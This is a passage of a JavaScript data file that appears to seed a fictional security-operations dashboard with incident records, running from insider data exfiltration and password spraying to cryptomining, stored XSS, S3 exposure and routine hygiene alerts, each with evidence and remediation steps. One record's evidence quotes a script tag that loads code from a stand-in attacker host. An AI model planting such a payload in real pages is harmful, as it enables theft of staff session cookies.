        impact: "Mass regulatory non-compliance (GDPR / CCPA / HIPAA); severe financial penalties; customer trust erosion.",
        recommendations: [
            "Take claims submission endpoint offline immediately and deploy parameterized statement patch.",
            "Initiate forensic audit to determine exact rows queried by timing script.",
            "Prepare regulatory data breach notification disclosure draft."
        ],
        investigation: {
            status: "investigating",
            timeline: [
                { text: "DAM anomaly threshold crossed (query count > 5,000)", time: "16 hours ago", active: false },
                { text: "Web module disabled by application engineer", time: "14 hours ago", active: true }
            ],
            notes: "Legacy module quarantined. Code rewrite to ORM/parameterized queries underway. Legal council notified for breach assessment."
        }
    },

    // ═══════════════════════════════════════════════════════════════
    // MEDIUM SEVERITY THREATS (Burnished Amber / Gold)
    // ═══════════════════════════════════════════════════════════════
    {
        id: "TS-2026-0015",
        title: "Unusual Bulk Outbound Data Transfer Volume to Personal Cloud Storage",
        severity: "medium",
        status: "new",
        category: "DLP / Insider",
        mitre: "T1567.002, T1048",
        region: "North America (US-West)",
        sector: "Semiconductor",
        timestamp: new Date(Date.now() - 6 * 3600 * 1000).toISOString(),
        asset: "ws-eng-chipdesign-042.internal",
        source: "Data Loss Prevention (DLP) Agent",
        cvss: 6.5,
        reason: "A workstation in the proprietary silicon engineering group transferred 4.7 GB of compressed archives to an unsanctioned personal Dropbox account at 22:45 local time, exceeding the 99th percentile for department daily egress.",
        evidence: [
            { text: "4.7 GB gzip archive uploaded to personal dropbox.com account via HTTPS", ref: "DLP-UP-47GB" },
            { text: "File names in archive contain 'rtl_core_v4_verilog_source'", ref: "DLP-NAME-MATCH" },
            { text: "User submitted two-week resignation notice earlier this morning", ref: "HR-STATUS-RES" },
            { text: "Workstation USB storage disablement policy was active at time of transfer", ref: "USB-POL-ACTIVE" }
        ],
        confidence: {
            level: 79,
            label: "Moderate-High",
            explanation: "Upload volume and file contents match intellectual property, coinciding with resignation timing."
        },
        known: [
            "Large archive containing source code uploaded to personal storage.",
            "Employee recently resigned.",
            "Transfer took place outside business hours."
        ],
        unverified: [
            "Whether transfer was authorized by engineering management for remote work.",
            "Whether files contain full chip schematics or documentation."
        ],
        impact: "Theft of trade secrets and semiconductor architectural intellectual property.",
        recommendations: [
            "Block workstation network access pending HR and Legal review.",
            "Request corporate legal preservation order for personal storage account.",
            "Interview departing employee regarding file transfer reasons."
        ],
        investigation: {
            status: "new",
            timeline: [
                { text: "DLP outbound volume threshold alert triggered", time: "6 hours ago", active: true },
                { text: "HR and Legal notified", time: "Pending", active: false }
            ],
            notes: ""
        }
    },
    {
        id: "TS-2026-0016",
        title: "Distributed Password Spray Attack Against Exchange Web Access",
        severity: "medium",
        status: "investigating",
        category: "Credential Access",
        mitre: "T1110.003",
        region: "Europe (Zurich)",
        sector: "Banking",
        timestamp: new Date(Date.now() - 18 * 3600 * 1000).toISOString(),
        asset: "mail-owa-front-01.bank.ch",
        source: "SIEM Behavioral Analytics",
        cvss: 6.8,
        reason: "A low-and-slow password spray campaign tested 3 commonly used seasonal passwords ('Autumn2026!', 'Welcome2026!') across 1,400 corporate email mailboxes from 80 residential proxy IP addresses to evade rate limits.",
        evidence: [
            { text: "1,400 unique accounts targeted with 1 attempt every 15 minutes", ref: "AUTH-SPRAY-1400" },
            { text: "Source IPs rotated through known residential proxy networks (Luminati/Oxylabs)", ref: "PROXY-RESID-80" },
            { text: "4 accounts locked out due to password age expiration rules", ref: "LOCKOUT-ACCT-4" },
            { text: "No single IP exceeded 2 failed attempts per hour", ref: "RATE-BYPASS-01" }
        ],
        confidence: {
            level: 86,
            label: "High",
            explanation: "Timing distribution across extensive user accounts is a textbook password spraying signature."
        },
        known: [
            "Low-and-slow spray targeting Active Directory synced mailboxes.",
            "Residential proxy network utilized to evade IP reputation blocks."
        ],
        unverified: [
            "Whether any mailbox password was successfully guessed.",
            "Identity of external threat actor."
        ],
        impact: "Compromise of corporate email communications, executive calendar scheduling, and spear-phishing leverage.",
        recommendations: [
            "Audit authentication logs for successful logins immediately following failed spray events.",
            "Enforce Smart Lockout policies that track username failure frequency globally.",
            "Mandate FIDO2 security keys for all Outlook Web Access sessions."
        ],
        investigation: {
            status: "investigating",
            timeline: [
                { text: "Behavioral analytics correlated distributed spray", time: "18 hours ago", active: false },
                { text: "Audit of all 1,400 accounts confirmed 0 successful logins", time: "15 hours ago", active: true }
            ],
            notes: "Zero accounts compromised. Smart Lockout policy deployed across all perimeter portals."
        }
    },
    {
        id: "TS-2026-0017",
        title: "Unauthorized Cryptomining Daemon Detected in Staging Kubernetes Pod",
        severity: "medium",
        status: "resolved",
        category: "Resource Hijacking",
        mitre: "T1496",
        region: "North America (US-East)",
        sector: "SaaS / Cloud",
        timestamp: new Date(Date.now() - 20 * 3600 * 1000).toISOString(),
        asset: "k8s-staging-worker-12.node",
        source: "Host Runtime Monitor",
        cvss: 5.9,
        reason: "CPU utilization pegged at 100% on a staging node. Process inspection revealed an unauthorized Monero mining worker process executing under the name 'systemd-daemon' in a customer test container.",
        evidence: [
            { text: "Process 'systemd-daemon' communicating with stratum+tcp://xmr-pool.hash.org:3333", ref: "PROC-MINE-XMR" },
            { text: "Host CPU core usage sustained at 99.8% across all 16 vCPUs", ref: "CPU-SPIKE-16" },
            { text: "Container was deployed via exposed Redis database with blank password", ref: "REDIS-UNAUTH-0" },
            { text: "Zero access to production database networks from this staging VPC", ref: "VPC-ISOLATE-OK" }
        ],
        confidence: {
            level: 94,
            label: "High",
            explanation: "Stratum mining protocol handshake and cryptocurrency pool destination verified."
        },
        known: [
            "Mining daemon active in staging Redis container.",
            "Compute bill inflated; no data compromised.",
            "VPC network strictly isolated from production."
        ],
        unverified: [
            "Duration of unauthorized mining before CPU alarm engaged."
        ],
        impact: "Excess cloud compute expenses and staging environment service degradation.",
        recommendations: [
            "Terminate rogue container pod and enforce Redis authentication password.",
            "Add CPU throttling limits (cgroups) on staging container manifests.",
            "Block all outbound Stratum mining protocol ports at VPC security group."
        ],
        investigation: {
            status: "resolved",
            timeline: [
                { text: "CPU alert triggered in Datadog", time: "20 hours ago", active: false },
                { text: "Pod terminated and Redis secured with auth string", time: "19 hours ago", active: true }
            ],
            notes: "Pod killed. Firewall rule added to block port 3333 and 4444 globally across cloud accounts."
        }
    },
    {
        id: "TS-2026-0018",
        title: "Suspicious API Access Token Usage from Automated Scraping Cluster",
        severity: "medium",
        status: "new",
        category: "API Abuse",
        mitre: "T1119",
        region: "Asia Pacific (Singapore)",
        sector: "Travel & Hospitality",
        timestamp: new Date(Date.now() - 22 * 3600 * 1000).toISOString(),
        asset: "api-pricing-engine-v2.prod",
        source: "API Gateway Rate Limiter",
        cvss: 6.2,
        reason: "A single partner API client credential was used to query competitive flight pricing endpoints at 450 requests/sec across 250 distinct rotating client IPs, simulating a distributed price scraping botnet.",
        evidence: [
            { text: "450 requests/second from client ID 'partner_travel_air_99'", ref: "API-RATE-450" },
            { text: "Traffic distributed across cloud provider subnets in 12 regions", ref: "GEO-ROT-12" },
            { text: "Database response times on pricing table increased 240ms", ref: "DB-LATENCY-SPIKE" },
            { text: "Partner agreement limits queries to 25 requests/second", ref: "SLA-VIOLATION" }
        ],
        confidence: {
            level: 89,
            label: "High",
            explanation: "Definitive rate counter logs and partner credential attribution."
        },
        known: [
            "Partner querying API at 18x permitted contractual limit.",
            "Infrastructure latency impacts beginning to surface."
        ],
        unverified: [
            "Whether partner credential was compromised or intentionally abused."
        ],
        impact: "Backend database performance degradation and unfair commercial intelligence extraction.",
        recommendations: [
            "Throttle partner API key to contractual limit of 25 rps.",
            "Issue non-compliance warning notice to partner technical contacts.",
            "Implement token-bucket rate limiter in API gateway layer."
        ],
        investigation: {
            status: "new",
            timeline: [
                { text: "API rate alarm crossed SLA limit", time: "22 hours ago", active: true },
                { text: "Pending partner outreach", time: "Pending", active: false }
            ],
            notes: ""
        }
    },
    {
        id: "TS-2026-0019",
        title: "Cross-Site Scripting (Stored XSS) Payload Stored in Support Ticket Thread",
        severity: "medium",
        status: "investigating",
        category: "Web / Application",
        mitre: "T1189, T1059.007",
        region: "North America (US-East)",
        sector: "Customer Support",
        timestamp: new Date(Date.now() - 26 * 3600 * 1000).toISOString(),
        asset: "helpdesk-internal-portal.corp",
        source: "Application Security Scanner",
        cvss: 6.4,
        reason: "A customer support ticket subject line contained an encoded JavaScript payload designed to steal session cookies of helpdesk agents upon opening the support ticket dashboard.",
        evidence: [
            { text: "Ticket #49201 subject: <script src='https://hook.attacker-c2.net/t.js'></script>", ref: "TICKET-XSS-PAYLOAD" },
            { text: "Helpdesk portal lacked HTML entity encoding on ticket review table", ref: "PORTAL-RENDER-BUG" },
            { text: "WAF failed to sanitize due to nested double-URL encoding", ref: "WAF-BYPASS-ENC" },
            { text: "Ticket flagged by heuristic scanner before opened by tier-1 staff", ref: "HEUR-SCAN-PASS" }
        ],
        confidence: {
            level: 91,
            label: "High",
            explanation: "Direct inspection of raw ticket database record confirms live malicious script tag."
        },
        known: [
            "Stored XSS string residing in customer support database.",
            "Ticket was held in quarantine before staff viewed it.",
            "Session tokens have not been leaked."
        ],
        unverified: [
            "Whether attacker submitted similar tickets under alternative customer accounts."
        ],
        impact: "Session hijacking of customer support staff; potential unauthorized access to customer account data.",
        recommendations: [
            "Sanitize ticket body in database and implement React DOM text encoding.",
            "Enforce strict Content-Security-Policy (CSP) blocking external script sources.",
            "Audit all tickets submitted by the originating customer email."
        ],
        investigation: {
            status: "investigating",
            timeline: [
                { text: "Heuristic scan quarantined ticket #49201", time: "26 hours ago", active: false },
                { text: "Front-end engineering deployed hotfix with HTML escape filter", time: "24 hours ago", active: true }
            ],
            notes: "Ticket quarantined. Fix merged to production. Originating account banned."
        }
    },
    {
        id: "TS-2026-0020",
        title: "S3 Cloud Storage Bucket Permission Drift Exposing Billing Artifacts",
        severity: "medium",
        status: "resolved",
        category: "Cloud / Config",
        mitre: "T1530",
        region: "North America (US-West)",
        sector: "FinTech",
        timestamp: new Date(Date.now() - 28 * 3600 * 1000).toISOString(),
        asset: "s3://corp-invoicing-archive-2025",
        source: "Cloud Security Posture Management (CSPM)",
        cvss: 6.7,
        reason: "An automated infrastructure-as-code Terraform update accidentally removed the 'BlockPublicAcls' restriction on a legacy S3 storage bucket containing archived invoice PDF summaries from Q1 2025.",
        evidence: [
            { text: "CSPM drift detector flagged S3 bucket policy changed to PublicRead", ref: "CSPM-ALERT-441" },
            { text: "Terraform commit #a9f02c modified S3 resource definition", ref: "GIT-COMMIT-TF" },
            { text: "AWS CloudTrail log showed 3 unauthorized GET requests from anonymous IP", ref: "CLOUDTRAIL-GET-3" },
            { text: "Bucket contained 1,200 PDF records with client company names and billed amounts", ref: "S3-RECORD-COUNT" }
        ],
        confidence: {
            level: 98,
            label: "Definitive",
            explanation: "CloudTrail audit logs confirm exact permission drift and anonymous reads."
        },
        known: [
            "Public ACL was active for 42 minutes before automated rollback.",
            "3 invoice files downloaded by crawler bot.",
            "No credit card or banking routing numbers contained in PDFs."
        ],
        unverified: [
            "Whether downloaded invoice PDFs have been published online."
        ],
        impact: "Confidentiality leak of client billing volume and commercial contractual pricing.",
        recommendations: [
            "Enforce organization-wide AWS Service Control Policy (SCP) blocking public S3 globally.",
            "Implement pre-commit static analysis checks (Checkov/tfsec) on all IaC pull requests.",
            "Notify the 3 affected client accounts."
        ],
        investigation: {
            status: "resolved",
            timeline: [
                { text: "CSPM alert detected public S3 bucket", time: "28 hours ago", active: false },
                { text: "Automated remediation Lambda applied BlockPublicAccess", time: "27 hours 18 minutes ago", active: true }
            ],
            notes: "SCP enforced at AWS Org level. Terraform pipeline now rejects any public bucket declarations."
        }
    },
    {
        id: "TS-2026-0021",
        title: "Malicious Chrome Browser Extension Installed on Financial Trader Terminal",
        severity: "medium",
        status: "investigating",
        category: "Endpoint / Adware",
        mitre: "T1176",
        region: "United Kingdom (London)",
        sector: "Equities Trading",
        timestamp: new Date(Date.now() - 30 * 3600 * 1000).toISOString(),
        asset: "ws-trader-lon-08.trading",
        source: "EDR Browser Extension Auditor",
        cvss: 6.1,
        reason: "A trader installed an unauthorized browser extension claiming to be a PDF converter. Code analysis indicates the extension requests permissions to read and alter all web traffic, capturing DOM inputs on financial trading portals.",
        evidence: [
            { text: "Extension ID 'kfnj...pdfconvert' installed via sideloading developer mode", ref: "EXT-ID-SIDELOAD" },
            { text: "Manifest permissions request '<all_urls>' and 'cookies' access", ref: "EXT-MAN-ALL" },
            { text: "Background worker script transmits keystroke telemetry to external server", ref: "NET-EXT-TELEMETRY" },
            { text: "Device is subject to strict regulatory trading terminal lockdown policies", ref: "REG-FINRA-SEC" }
        ],
        confidence: {
            level: 87,
            label: "High",
            explanation: "Malicious background script code decompiled directly from user profile directory."
        },
        known: [
            "Unauthorized extension installed bypassing standard policy.",
            "Keylogger capability embedded in background worker.",
            "Host used for high-frequency equities execution."
        ],
        unverified: [
            "Whether order credentials or client trade data were exfiltrated."
        ],
        impact: "Insider trading exposure, leakage of trade order flow, regulatory sanctions.",
        recommendations: [
            "Remotely remove extension and enforce Google Chrome Enterprise Extension Whitelist GPO.",
            "Rotate trading station credentials and order-routing API keys.",
            "Conduct compliance interview with trader."
        ],
        investigation: {
            status: "investigating",
            timeline: [
                { text: "EDR auditor flagged sideloaded extension", time: "30 hours ago", active: false },
                { text: "Extension forcibly uninstalled via MDM", time: "29 hours ago", active: true }
            ],
            notes: "Trader terminal re-imaged with locked enterprise profile. Trade logs audited: no rogue orders detected."
        }
    },

    // ═══════════════════════════════════════════════════════════════
    // LOW SEVERITY THREATS (Cool Slate / Teal)
    // ═══════════════════════════════════════════════════════════════
    {
        id: "TS-2026-0022",
        title: "TLS Certificate Approaching Expiration on Internal Metrics Cluster",
        severity: "low",
        status: "new",
        category: "Certificate / Hygiene",
        mitre: "T1588.004",
        region: "North America (US-East)",
        sector: "Infrastructure Operations",
        timestamp: new Date(Date.now() - 24 * 3600 * 1000).toISOString(),
        asset: "api-internal-metrics.corp:443",
        source: "Certificate Lifecycle Monitor",
        cvss: 3.2,
        reason: "An internal service TLS certificate issued by corporate internal PKI will expire in 11 days. Auto-renewal automation failed due to an outdated ACME DNS-01 challenge secret.",
        evidence: [
            { text: "Certificate CN=api-internal-metrics.corp valid until 2026-11-04 23:59 UTC", ref: "CERT-EXP-DATE" },
            { text: "ACME renewal daemon logged HTTP 401 Unauthorized against Vault PKI engine", ref: "ACME-ERR-401" },
            { text: "Service used by internal Grafana dashboards (non-customer facing)", ref: "ASSET-GRAFANA" }
        ],
        confidence: {
            level: 99,
            label: "Definitive",
            explanation: "Deterministic expiration timestamp extracted directly from X.509 certificate."
        },
        known: [
            "Certificate expires in 11 days.",
            "ACME automated token expired.",
            "Internal non-customer facing service."
        ],
        unverified: [
            "Whether secondary monitoring instances rely on this certificate for mutual TLS."
        ],
        impact: "Internal monitoring dashboard outages if certificate expires; potential security bypass workarounds.",
        recommendations: [
            "Update ACME credentials in Vault secret engine.",
            "Trigger manual cert renewal before expiration window.",
            "Review fleet-wide certificate expiration dashboard."
        ],
        investigation: {
            status: "new",
            timeline: [
                { text: "Warning alert at 14 days to expiration", time: "24 hours ago", active: true },
                { text: "Awaiting DevOps engineer assignment", time: "Pending", active: false }
            ],
            notes: ""
        }
    },
    {
        id: "TS-2026-0023",
        title: "Staging Web Server Component Outdated (Non-Exploitable Configuration)",
        severity: "low",
        status: "resolved",
        category: "Vulnerability / Hygiene",
        mitre: "T1190",
        region: "Europe (Frankfurt)",
        sector: "Development Environment",
        timestamp: new Date(Date.now() - 48 * 3600 * 1000).toISOString(),
        asset: "web-staging-02.internal",
        source: "Vulnerability Scanner",
        cvss: 4.3,
        reason: "Routine scan flagged Apache HTTP Server 2.4.49 on internal staging host. Although associated with CVE-2021-41773, the vulnerable module 'mod_cgi' is disabled and host is non-internet-facing.",
        evidence: [
            { text: "Apache HTTP Server 2.4.49 detected via banner grab", ref: "VULN-APACHE-2449" },
            { text: "Configuration audit confirms 'mod_cgi' is NOT enabled", ref: "CONF-MODCGI-OFF" },
            { text: "Host is isolated within internal staging subnet 10.200.40.0/24", ref: "NET-STAGING-VLAN" }
        ],
        confidence: {
            level: 70,
            label: "Moderate",
            explanation: "Vulnerability version present, but non-vulnerable configuration eliminates exploitability."
        },
        known: [
            "Software version has known CVE.",
            "Exploit conditions absent in current configuration."
        ],
        unverified: [
            "Whether future configuration changes might inadvertently enable mod_cgi."
        ],
        impact: "Minimal risk; hygiene non-compliance.",
        recommendations: [
            "Update Apache to latest stable release during scheduled maintenance.",
            "Automate staging package updates in CI/CD base AMI."
        ],
        investigation: {
            status: "resolved",
            timeline: [
                { text: "Vulnerability scan ticket created", time: "48 hours ago", active: false },
                { text: "Upgraded to Apache 2.4.62", time: "12 hours ago", active: true }
            ],
            notes: "Package updated. Verified clean on rescan."
        }
    },
    {
        id: "TS-2026-0024",
        title: "DMARC Policy Subdomain Spoofing Attempt Blocked by Mail Gateway",
        severity: "low",
        status: "resolved",
        category: "Email / Phishing",
        mitre: "T1566.002",
        region: "Global Inbound",
        sector: "Corporate Communications",
        timestamp: new Date(Date.now() - 52 * 3600 * 1000).toISOString(),
        asset: "mx-inbound-edge-01.corp",
        source: "Email Security Gateway",
        cvss: 3.5,
        reason: "An external spam sender attempted to forge email sender headers claiming to be 'billing@sub.threatstorm.io'. The inbound gateway dropped the email due to strict DMARC 'p=reject' policy enforcement.",
        evidence: [
            { text: "DMARC validation failed: DKIM absent and SPF failed for source IP 194.26.29.11", ref: "DMARC-FAIL-REJECT" },
            { text: "Email envelope sender: billing@sub.threatstorm.io", ref: "MAIL-ENV-FROM" },
            { text: "Message dropped before delivery to employee inboxes", ref: "MX-ACTION-DROP" }
        ],
        confidence: {
            level: 98,
            label: "Definitive",
            explanation: "Cryptographic SPF/DKIM verification failure logged at edge gateway."
        },
        known: [
            "Spoofed email was rejected.",
            "DMARC reject policy functioned as designed.",
            "Zero employees received message."
        ],
        unverified: [
            "Whether phishing campaign targeted other domains with less strict policies."
        ],
        impact: "Negligible; policy successfully prevented brand impersonation.",
        recommendations: [
            "Maintain p=reject policy across all registered top-level and subdomains.",
            "Monitor DMARC aggregate XML reports for spoofing trends."
        ],
        investigation: {
            status: "resolved",
            timeline: [
                { text: "Gateway rejected spoofed email", time: "52 hours ago", active: true }
            ],
            notes: "Automated block logged. Source IP added to global spam blacklist."
        }
    },
    {
        id: "TS-2026-0025",
        title: "SSH Port Sweep Probing Edge Bastion Gateway from Known Scanner Range",
        severity: "low",
        status: "resolved",
        category: "Reconnaissance",
        mitre: "T1046",
        region: "North America (US-East)",
        sector: "Perimeter Defense",
        timestamp: new Date(Date.now() - 56 * 3600 * 1000).toISOString(),
        asset: "bastion-edge-public-01.corp",
        source: "Border Firewall IDS",
        cvss: 2.8,
        reason: "Routine internet-wide port scan from Shodan/Censys research subnet sent TCP SYN packets to port 22. Bastion only accepts connections from corporate VPN IP addresses; handshake was silently dropped.",
        evidence: [
            { text: "TCP SYN packets received on port 22 from Shodan scanner 198.20.99.130", ref: "FW-DROP-SYN" },
            { text: "Firewall rule 'DROP_UNTRUSTED_INGRESS' engaged silently", ref: "FW-RULE-402" },
            { text: "Bastion SSH service not exposed to public routing table", ref: "NET-VPN-ACL" }
        ],
        confidence: {
            level: 99,
            label: "Definitive",
            explanation: "Source IP verified against published scanner ASN ranges."
        },
        known: [
            "Standard internet background noise scanning.",
            "No connection completed.",
            "Bastion port remains closed."
        ],
        unverified: [],
        impact: "Zero operational impact.",
        recommendations: [
            "Continue silent drop of non-whitelisted perimeter traffic.",
            "No further analyst intervention required."
        ],
        investigation: {
            status: "resolved",
            timeline: [
                { text: "IDS logged scanner ping", time: "56 hours ago", active: true }
            ],
            notes: "Routine noise. Auto-resolved by policy."
        }
    },
    {
        id: "TS-2026-0026",
        title: "NTP Monlist Reflection Amplification Probe Deflected by Edge DDoS Shield",
        severity: "low",
        status: "resolved",
        category: "DDoS / Recon",
        mitre: "T1498.001",
        region: "Europe (Amsterdam)",
        sector: "Network Operations",
        timestamp: new Date(Date.now() - 60 * 3600 * 1000).toISOString(),
        asset: "ntp-edge-sync-01.corp",
        source: "DDoS Edge Scrubber",
        cvss: 3.1,
        reason: "Inbound UDP query requesting 'monlist' command sent to corporate time synchronization edge. NTP daemon runs version with monlist disabled and scrubbing filter dropped the UDP burst.",
        evidence: [
            { text: "UDP packet on port 123 with mode 7 monlist command header", ref: "NTP-MONLIST-PKT" },
            { text: "Edge DDoS rate limiter dropped 240 spoofed requests", ref: "DDoS-SCRUB-DROP" },
            { text: "NTP service configured with 'disable monitor' directive", ref: "NTP-CONF-SECURE" }
        ],
        confidence: {
            level: 97,
            label: "High",
            explanation: "Packet payload inspection clearly matches legacy NTP reflection vector."
        },
        known: [
            "NTP amplification attempt failed.",
            "Server cannot be weaponized as an amplifier."
        ],
        unverified: [],
        impact: "Zero impact to corporate time services or network bandwidth.",
        recommendations: [
            "Verify chrony/NTP configs across all edge appliances retain 'disable monitor'.",
            "Maintain DDoS scrubbing policies on public UDP endpoints."
        ],
        investigation: {
            status: "resolved",
            timeline: [
                { text: "Edge scrubber absorbed UDP spike", time: "60 hours ago", active: true }
            ],
            notes: "Scrubber handled event automatically."
        }
    },
    {
        id: "TS-2026-0027",
        title: "Developer Workstation Antivirus Signature Definition Stale by 48 Hours",
        severity: "low",
        status: "new",
        category: "Endpoint / Hygiene",
        mitre: "T1562.001",
        region: "North America (US-Central)",
        sector: "Engineering",
        timestamp: new Date(Date.now() - 64 * 3600 * 1000).toISOString(),
        asset: "ws-dev-frontend-19.internal",
        source: "Endpoint Management Console",
        cvss: 2.5,
        reason: "A remote developer laptop has not updated its local antivirus signature database in 48 hours because the user had been offline during a cross-country travel period.",
        evidence: [
            { text: "Antivirus definition version: 2026.10.22 (current is 2026.10.24)", ref: "AV-SIG-AGE" },
            { text: "Host reconnected to corporate VPN 20 minutes ago", ref: "VPN-RECONNECT" },
            { text: "Signature update daemon initiated background sync", ref: "AV-SYNC-AUTO" }
        ],
        confidence: {
            level: 99,
            label: "Definitive",
            explanation: "Direct software version query against central management agent."
        },
        known: [
            "Definitions are 2 days behind.",
            "Laptop reconnected and update is downloading."
        ],
        unverified: [],
        impact: "Marginal reduction in zero-day heuristic protection during the offline period.",
        recommendations: [
            "Allow background signature sync to finalize.",
            "Verify compliance status within 1 hour."
        ],
        investigation: {
            status: "new",
            timeline: [
                { text: "Stale definition notification generated", time: "64 hours ago", active: true }
            ],
            notes: ""
        }
    },
    {
        id: "TS-2026-0028",
        title: "Failed RDP Authentication Burst from Decommissioned Lab Hypervisor",
        severity: "low",
        status: "resolved",
        category: "Internal / Misconfig",
        mitre: "T1078",
        region: "North America (Texas)",
        sector: "Internal Lab",
        timestamp: new Date(Date.now() - 72 * 3600 * 1000).toISOString(),
        asset: "lab-srv-oldtest-04.dev",
        source: "SIEM Windows Security Log",
        cvss: 2.9,
        reason: "An automated scheduled health-check script on a legacy testing server attempted to authenticate via RDP with expired credentials 50 times before the script timed out.",
        evidence: [
            { text: "50 failed RDP logins for account 'lab_test_admin'", ref: "RDP-FAIL-50" },
            { text: "Origin IP 10.99.12.4 belongs to decommissioned physical lab rack", ref: "IP-LAB-RACK" },
            { text: "Script identified: test_rdp_connectivity.ps1 running in Task Scheduler", ref: "PS-SCRIPT-TEST" }
        ],
        confidence: {
            level: 95,
            label: "High",
            explanation: "Process and script source confirmed to be internal diagnostic cron."
        },
        known: [
            "Internal non-malicious script misconfiguration.",
            "Server scheduled for full hardware decommissioning next week."
        ],
        unverified: [],
        impact: "Log noise in SIEM dashboard.",
        recommendations: [
            "Disable scheduled task 'test_rdp_connectivity.ps1'.",
            "Proceed with physical rack decommissioning."
        ],
        investigation: {
            status: "resolved",
            timeline: [
                { text: "Alert investigated by SOC analyst", time: "72 hours ago", active: false },
                { text: "Task disabled by systems administrator", time: "70 hours ago", active: true }
            ],
            notes: "Benign internal script. Task terminated. No security risk."
        }
    }
];

// Severity ordering for sorting
const SEVERITY_ORDER = { critical: 4, high: 3, medium: 2, low: 1 };
